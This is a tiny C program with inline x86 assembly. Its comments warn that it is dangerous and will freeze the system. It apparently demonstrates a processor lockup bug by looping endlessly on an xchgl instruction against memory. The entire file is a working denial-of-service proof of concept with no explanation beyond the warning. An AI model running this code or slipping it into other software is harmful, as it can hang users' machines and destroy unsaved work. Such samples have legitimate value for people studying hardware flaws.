/* This program is DANGEROUS: it will lock (freeze) your system */
/* Read all the available documentation before executing it */

static unsigned char c[4] = {0x36, 0x78, 0x38, 0x36};
main()
{
asm ("movl	$c, %ebx\n\t"
"again:	xchgl	(%ebx), %eax\n\t"
	"movl	%eax, %edx\n\t"
	"jmp	again\n\t");
}
	